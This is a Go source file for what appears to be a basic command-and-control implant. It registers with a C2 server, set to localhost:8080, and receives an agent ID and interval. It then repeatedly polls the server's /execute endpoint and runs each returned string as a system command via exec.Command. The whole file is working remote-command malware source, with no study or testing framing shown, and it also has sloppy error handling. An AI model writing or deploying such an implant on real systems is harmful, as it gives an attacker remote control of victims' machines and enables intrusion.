package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"strings"
	"time"
)

var c2server = "localhost"
var c2serverport = "8080"

type RegisterResponse struct {
	AgentId  string `json:"agentId"`
	Interval int    `json:"interval"`
}

func main() {
	c2register := "http://" + c2server + ":" + c2serverport + "/register"
	register_resp, err := http.Get(c2register)

	if err != nil {
		log.Fatal(err)
	}

	defer register_resp.Body.Close()

	body, err := io.ReadAll(register_resp.Body)
	var registerResponse RegisterResponse
	err = json.Unmarshal(body, &registerResponse)
	if err != nil {
		log.Fatal(err)
	}

	agentId := registerResponse.AgentId
	interval := registerResponse.Interval
	fmt.Println("[*] Agent ID: " + agentId)
	fmt.Println("[*] Interval: " + fmt.Sprint(interval))
loop:
	for {
		fmt.Printf("[*] Sleeping for %v seconds", interval)
		time.Sleep(time.Duration(interval) * time.Second)
		data := url.Values{
			"agentId": {agentId},
		}
		c2execute := "http://" + c2server + ":" + c2serverport + "/execute"
		execute_response, err := http.PostForm(c2execute, data)

		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error fetching command: %s", err)
		}

		defer execute_response.Body.Close()

		command, err := io.ReadAll(execute_response.Body)

		if string(command) == "no commands found" {
			log.SetFlags(0)
			log.Println("\n[-] No command to run")
			goto loop
		}

		fmt.Println("[+] Running command: " + string(command))
		command_clean := strings.Replace(string(command), "\n", "", -1)
		command_array := strings.Fields(command_clean)
		out, err := exec.Command(command_array[0], command_array[1:]...).Output()
		if err != nil {
			log.SetFlags(0)
			log.Printf("[-] Error running command: %s", err)
		}
		fmt.Println(string(out))
	}
}
